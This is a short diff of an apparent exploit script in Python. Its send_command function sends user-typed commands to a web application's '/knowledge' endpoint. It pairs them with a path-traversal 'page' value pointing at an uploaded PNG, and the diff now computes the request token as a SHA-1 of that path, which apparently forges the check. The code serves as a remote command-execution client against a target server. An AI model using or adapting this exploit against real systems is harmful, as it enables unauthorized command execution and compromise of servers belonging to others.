@@ -3,7 +3,7 @@ import base64
 import urllib3
 import re 
 import argparse
-
+import hashlib
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -38,9 +38,11 @@ def get_user_command():
 
 def send_command(command, url, png_name):
     full_url = f"{url}/knowledge"
+    page_value = f"../../public/uploads/{png_name}"
+    token = hashlib.sha1(page_value.encode('utf-8')).hexdigest()
     payload = {
-        "page": f"../../public/uploads/{png_name}",
-        "token": "a646697405a18511bbe5a9b9e1872753eb4dcfa4",  
+        "page": page_value,
+        "token": token,
         "auth": auth,
         "data": command
     }
